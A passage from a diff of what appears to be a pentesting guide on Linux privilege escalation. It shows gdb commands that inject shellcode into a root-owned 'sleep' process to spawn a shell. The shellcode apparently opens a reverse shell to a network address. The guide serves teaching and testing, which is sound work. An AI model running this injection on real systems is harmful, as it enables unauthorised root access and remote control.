+> > set {long}($rip+16) = 0x0002b9489748050f
+> > set {long}($rip+24) = 0x48510b0e0a0a2923
+> > set {long}($rip+32) = 0x582a6a5a106ae689
+> > set {long}($rip+40) = 0xceff485e036a050f
+> > set {long}($rip+48) = 0x6af675050f58216a
+> > set {long}($rip+56) = 0x69622fbb4899583b
+> > set {long}($rip+64) = 0x8948530068732f6e
+> > set {long}($rip+72) = 0x050fe689485752e7
+> > c' > commands.gdb
+> > # In this case there was a sleep run by root
+> > ## NOTE that the process you abuse will die after the shellcode
+> > /usr/bin/gdb -p $(pgrep sleep)
+> > [...]
+> > (gdb) source commands.gdb
+> > Continuing.
+> > process 207009 is executing new program: /usr/bin/dash
+> > [...]
+> > ```
+> <!-- }}} -->
+>
 <!-- }}} -->
 
 **Example with environment (Docker breakout) - Another gdb Abuse**
